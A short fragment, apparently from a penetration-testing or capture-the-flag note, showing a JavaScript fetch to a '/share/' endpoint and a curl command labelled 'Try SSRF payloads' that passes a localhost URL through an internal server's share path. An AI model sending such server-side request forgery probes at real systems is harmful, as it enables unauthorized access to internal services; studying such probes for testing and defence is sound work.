```const response = await fetch(`/share/${sharedKey}`);```

```
    # Try SSRF payloads
    curl -X GET "http://10.0.0.10/share/http://127.0.0.1:80" \
    -H "Cookie: [your_cookie]"
```